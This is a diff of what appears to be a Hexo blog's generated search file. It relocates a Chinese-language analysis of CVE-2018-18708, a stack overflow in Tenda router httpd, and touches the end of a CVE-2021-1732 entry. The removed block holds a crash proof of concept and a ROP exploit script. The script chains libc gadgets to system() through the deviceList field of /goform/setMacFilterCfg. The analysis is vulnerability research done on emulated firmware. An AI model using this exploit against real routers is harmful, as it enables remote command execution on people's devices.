-<h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><pre class="line-numbers language-none"><code class="language-none">函数调用关系：sub_2E420 -&gt;  sub_2E9EC  -&gt;  sub_42378  -&gt;  formSetMacFilterCfg  -&gt;  sub_C14DC  -&gt;  sub_C17A0  -&gt;  sub_C24C0
-缓冲区：sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12
-字符串src：sub_2BA8C的返回值 -&gt; formSetMacFilterCfg的v17 -&gt; sub_C14DC的a2 -&gt; sub_C17A0的a2 -&gt; sub_C24C0的a1 -&gt; src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="sub-C24C0"><a href="#sub-C24C0" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p>漏洞点在sub_C24C0的strcpy函数</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114180104515.png"></p>
-<h4 id="sub-C17A0"><a href="#sub-C17A0" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>溢出字符串src是sub_C24C0函数的第一个参数a1，来自sub_C17A0的第二个参数a2</p>
-<p>缓冲区a2是sub_C24C0函数的第二个参数a2，来自sub_C17A0的v12。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110605912.png"></p>
-<h4 id="sub-C14DC"><a href="#sub-C14DC" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p>sub_C17A0的第二个参数a2来自sub_C14DC的第二个参数a2</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110852924.png"></p>
-<h4 id="formSetMacFilterCfg"><a href="#formSetMacFilterCfg" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数调用了sub_C14DC，sub_C14DC的第二个参数a2来自formSetMacFilterCfg的v17，v17是sub_2BA8C的返回值，程序获取到http请求的deviceList的值，传递给sub_C24C0函数的漏洞点。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115100854082.png"></p>
-<h3 id="调用链分支跳转"><a href="#调用链分支跳转" class="headerlink" title="调用链分支跳转"></a>调用链分支跳转</h3><p>函数中有不同功能的处理函数，显示请求到指定路径会调用相应的处理函数。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115172430094.png"></p>
-<p>进入formSetMacFilterCfg函数需要访问/goform/setMacFilterCfg</p>
-<h4 id="formSetMacFilterCfg-1"><a href="#formSetMacFilterCfg-1" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数存在两个分支，sub_C10D0和sub_C14DC</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173154042.png"></p>
-<p>v19为0才会进入sub_C14DC函数，因此sub_C10D0的返回值需要为0</p>
-<h4 id="sub-C10D0"><a href="#sub-C10D0" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173814704.png"></p>
-<p>sub_C10D0的返回值为0需要输入的数据a1为black或者white</p>
-<h4 id="sub-C24C0-1"><a href="#sub-C24C0-1" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115174215338.png"></p>
-<p>最终到达漏洞点之后会检测包含\r的字符串</p>
-<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>访问 <a href="http://192.168.130.137/goform/setMacFilterCfg">http://192.168.130.137/goform/setMacFilterCfg</a> 抓包</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141526174.png"></p>
-<p>返回{“errCode”:2}</p>
-<h4 id="formSetMacFilterCfg-2"><a href="#formSetMacFilterCfg-2" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>进入formSetMacFilterCfg函数，查看setMacFilterCfg接口对应的处理过程。</p>
-<p>调用了sub_2BA8C 和 sub_C10D0和sub_C10DC</p>
-<p>sub_2BA8C获取前端传过来的表单中获取对应的值。之后传入sub_C210D0</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115183255078.png"></p>
-<p>之后会对v19进行判断</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193726115.png"></p>
-<h4 id="sub-C10D0-1"><a href="#sub-C10D0-1" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p>对传入的值进行strcmp比较，决定返回的值。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193936050.png">判断是black还是white，如果满足其中一个返回0，否则返回2。如果没有就会返回2，所以抓包返回结果为{“errCode”:2}</p>
-<p>所以必须传参setMacFilterCfg为black或者white</p>
-<h4 id="sub-C14DC-1"><a href="#sub-C14DC-1" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115195021958.png"></p>
-<p>第二个参数是需要有\n，并且返回其地址。</p>
-<p>之后都会进入sub_C17A0函数</p>
-<h4 id="sub-C17A0-1"><a href="#sub-C17A0-1" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>调用了sub_C24C0，将deviceList和v12传入</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093215098.png"></p>
-<h4 id="sub-C24C0-2"><a href="#sub-C24C0-2" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093614037.png"></p>
-<h3 id="触发测试"><a href="#触发测试" class="headerlink" title="触发测试"></a>触发测试</h3><p>sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12，大小为176</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117141812438.png"></p>
-<p>根据http post请求内容构造</p>
-<pre class="line-numbers language-none"><code class="language-none">import requests
-url = "http://192.168.130.137/goform/setMacFilterCfg"
-cookie = {"Cookie":"password=csplqw"}
-data = {"macFilterType": "black", "deviceList":"\r" +  "A" * 176 + "bbbb"}
-requests.post(url, cookies=cookie, data=data)
-requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>测试</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
-
-gdb-multiarch ./bin/httpd
-target remote:1111
-
-python poc.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117144236144.png"></p>
-<p>正好覆盖</p>
-<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>开启了NX保护</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117145129715.png"></p>
-<h3 id="libc基址"><a href="#libc基址" class="headerlink" title="libc基址"></a>libc基址</h3><p>strcpy函数下断点找函数地址，0x3fdda508</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118173858830.png"></p>
-<p>找偏移</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174133012.png"></p>
-<p>算基址</p>
-<p>0x3fdda508-3e508=0x3fd9C000</p>
-<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary libc.so.0 --only "pop" | grep r3
-ROPgadget --binary libc.so.0 | grep "mov r0, sp ; blx r3"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155024462.png"></p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155334715.png"></p>
-<p>使用<code>0x00018298 : pop {r3, pc}</code>和 <code>0x00040cb8 : mov r0, sp ; blx r3</code>来构造rop。将第一个r3改成system_addr，将命令放在sp上，之后跳转到system_addr。</p>
-<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>readelf -s libc.so.0 | grep system</code>找system偏移</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117161402380.png"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>payload结构：[offset,gadget1,system,gadget2]</p>
-<pre class="line-numbers language-none"><code class="language-none">import requests
-from pwn import *
-cmd = b"echo hello"
-libc_base = 0x3fd9C000
-system_offset = 0x005a270
-gadget1_offset = 0x00018298
-gadget2_offset = 0x00040cb8
-system_addr = libc_base + system_offset
-gadget1 = gadget1_offset + libc_base
-gadget2 = gadget2_offset + libc_base
-payload = b"A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
-url = "http://192.168.130.137/goform/setMacFilterCfg"
-cookie = {"Cookie":"password=csplqw"}
-data = {"macFilterType": "black", "deviceList":b"\r" + payload}
-requests.post(url, cookies=cookie, data=data)
-requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174737035.png"></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2021-1732 win32K内核提权漏洞分析</title>
     <url>/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>内存破坏类内核提权漏洞一般是由C/C++的不安全操作引发，最常见的是Win32k组件中由于Callback机制导致的UAF漏洞。Windows操作系统设计初期，Win32k子系统是在用户态的，从Windows NT4开始，这部分代码移到了内核态，内核态增加了一个Win32k.sys模块，导致3个不安全的因素1.新的系统调用（1100+syscalls）2.用户模式回调（User-mode Callback）3.用户态和内核态之间的共享数据（Share data）。win32k是微软Windows子系统的图形GUI组件，该组件被用于Windows操作系统桌面的图形打印。由于win32k架构的原因，win32k的内核组件需要通过用户模式回调函数对用户模式下的代码进行调用，方便窗口的创建和管理。Win32k内核函数（如xxxCreateWindowEx）会通过用户进程PEBKernelCallBackTable生成回调函数（如xxxClientAllocWindowClassExtraBytes）,当用户模式回调函数完成后，会执行NtCallbackReturn将预期的返回参数传回内核，由于这些回调函数无状态特性，可以造成许多与对象锁定机制有关的漏洞。Win32k漏洞通常会利用tagWND数据结构的桌面对象，然后借助内核读写原语转化为纯数据攻击。</p>
@@ -1194,6 +792,408 @@ SetWindowLongPtr(hTargetWnd, TAGWND_BODY_REL_VALUE_OFF, 0);
 
 <h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><p>补丁打在了win32kfull!xxxCreateWindowEx</p>
 <p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809111624710.png"></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2018-18708 Tenda路由器栈溢出分析</title>
+    <url>/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2018-18708是Tenda路由器的httpd存在缓冲区溢出漏洞。可以利用该漏洞造成拒绝服务。</p>
+<p>影响版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">AC7 V15.03.06.44_CN
+AC9 V15.03.05.19_CN
+AC10 V15.03.06.23_CN
+AC15 V15.03.05.19_CN
+AC18 V15.03.05.19(6318)_CN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>US_AC15V1.0BR_V15.03.05.19_multi_TD01</p>
+<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
+<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看文件信息，是arm</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116165640011.png"></p>
+<p>qemu执行</p>
+<pre class="line-numbers language-none"><code class="language-none">cd _US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root
+cp $(which qemu-arm-static) ./
+sudo chroot ./ ./qemu-arm-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>会卡在Welcome to</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114111007129.png"></p>
+<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>ida分析发现sub_2E420，发现welcome to之后有两处check，第一处check不通过会进入休眠状态，第二个检查连接情况，不通过会打印连接失败。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114112513082.png"></p>
+<p>patch掉这两处的检测</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144110897.png"></p>
+<p>patch掉之后继续执行</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144236394.png"></p>
+<p>安装uml-utilities</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt install uml-utilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>安装bridge-utils</p>
+<pre class="line-numbers language-none"><code class="language-none">https://mirrors.edge.kernel.org/pub/linux/utils/net/bridge-utils/bridge-utils-1.7.1.tar.xz
+tar -xvf bridge-utils-1.7.1.tar.xz
+autoconf
+./configure
+make
+sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113136378.png"></p>
+<h4 id="定位ip"><a href="#定位ip" class="headerlink" title="定位ip"></a>定位ip</h4><p>搜索字符串Listen ip定位到sub_1B84C函数</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113711000.png"></p>
+<p>分析调用链</p>
+<p><code>sub_2E420 -&gt; sub_2E9EC -&gt; sub_29510  -&gt; sub_29818 -&gt;  sub_1B84C</code></p>
+<p>函数sub_29818调用了sub_1B84C</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115132854149.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
+gdb-multiarch
+set architecture arm
+b*0x1B84C
+target remote:1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115142522808.png"></p>
+<p>对ip参数v8进行定位</p>
+<p>v8和s.sa_data[2]、a1有关</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143459247.png"></p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143338834.png"></p>
+<p>往上回溯，sub_29818调用了sub_1B84C，sub_29818的v8是了sub_1B84C的第一个参数a1</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115144144585.png"></p>
+<p>往上回溯到sub_2E420，ip的值与s和v19有关。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115150620540.png"></p>
+<p>查看getIfIp</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115151018366.png"></p>
+<p>getIfIp为外部导入函数，位于libcommon.so中</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160146351.png"></p>
+<p>ioctl有三个参数，第一个参数fd由socket()系统调用返回，第二个参数获取IP地址。第三个参数与getLanIfName函数有关。</p>
+<p>因此函数整体流程为获取IP地址返回v2，v2的值为0不会进入if循环，ip的值由v19决定，v19是getIfIp函数的第二个参数v2，系统调用获取IP后赋给a2(v19)。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160907362.png"></p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161237390.png"></p>
+<p>getLanIfName会调用get_eth_name函数，参数写死为0，get_eth_name在libChipApi.so中，查看libChipApi.so中的get_eth_name函数，函数返回v1，为网卡名称</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161516417.png"></p>
+<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><p>因此整体流程为getLanIfName函数调用get_eth_name函数获取网卡名称，将网卡名称做为参数输入到getIfIp中。函数寻找名称为br0的网卡的ip地址传递给v19。因此让程序监听正确的ip地址需要新建br0网卡。</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
+sudo brctl addif br0 eth0
+sudo ifconfig br0 up
+sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>重新启动找到了br0网卡并获取了ip地址</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141128835.png"></p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141227111.png"></p>
+<h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><pre class="line-numbers language-none"><code class="language-none">函数调用关系：sub_2E420 -&gt;  sub_2E9EC  -&gt;  sub_42378  -&gt;  formSetMacFilterCfg  -&gt;  sub_C14DC  -&gt;  sub_C17A0  -&gt;  sub_C24C0
+缓冲区：sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12
+字符串src：sub_2BA8C的返回值 -&gt; formSetMacFilterCfg的v17 -&gt; sub_C14DC的a2 -&gt; sub_C17A0的a2 -&gt; sub_C24C0的a1 -&gt; src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="sub-C24C0"><a href="#sub-C24C0" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p>漏洞点在sub_C24C0的strcpy函数</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114180104515.png"></p>
+<h4 id="sub-C17A0"><a href="#sub-C17A0" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>溢出字符串src是sub_C24C0函数的第一个参数a1，来自sub_C17A0的第二个参数a2</p>
+<p>缓冲区a2是sub_C24C0函数的第二个参数a2，来自sub_C17A0的v12。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110605912.png"></p>
+<h4 id="sub-C14DC"><a href="#sub-C14DC" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p>sub_C17A0的第二个参数a2来自sub_C14DC的第二个参数a2</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110852924.png"></p>
+<h4 id="formSetMacFilterCfg"><a href="#formSetMacFilterCfg" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数调用了sub_C14DC，sub_C14DC的第二个参数a2来自formSetMacFilterCfg的v17，v17是sub_2BA8C的返回值，程序获取到http请求的deviceList的值，传递给sub_C24C0函数的漏洞点。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115100854082.png"></p>
+<h3 id="调用链分支跳转"><a href="#调用链分支跳转" class="headerlink" title="调用链分支跳转"></a>调用链分支跳转</h3><p>函数中有不同功能的处理函数，显示请求到指定路径会调用相应的处理函数。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115172430094.png"></p>
+<p>进入formSetMacFilterCfg函数需要访问/goform/setMacFilterCfg</p>
+<h4 id="formSetMacFilterCfg-1"><a href="#formSetMacFilterCfg-1" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数存在两个分支，sub_C10D0和sub_C14DC</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173154042.png"></p>
+<p>v19为0才会进入sub_C14DC函数，因此sub_C10D0的返回值需要为0</p>
+<h4 id="sub-C10D0"><a href="#sub-C10D0" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173814704.png"></p>
+<p>sub_C10D0的返回值为0需要输入的数据a1为black或者white</p>
+<h4 id="sub-C24C0-1"><a href="#sub-C24C0-1" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115174215338.png"></p>
+<p>最终到达漏洞点之后会检测包含\r的字符串</p>
+<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>访问 <a href="http://192.168.130.137/goform/setMacFilterCfg">http://192.168.130.137/goform/setMacFilterCfg</a> 抓包</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141526174.png"></p>
+<p>返回{“errCode”:2}</p>
+<h4 id="formSetMacFilterCfg-2"><a href="#formSetMacFilterCfg-2" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>进入formSetMacFilterCfg函数，查看setMacFilterCfg接口对应的处理过程。</p>
+<p>调用了sub_2BA8C 和 sub_C10D0和sub_C10DC</p>
+<p>sub_2BA8C获取前端传过来的表单中获取对应的值。之后传入sub_C210D0</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115183255078.png"></p>
+<p>之后会对v19进行判断</p>
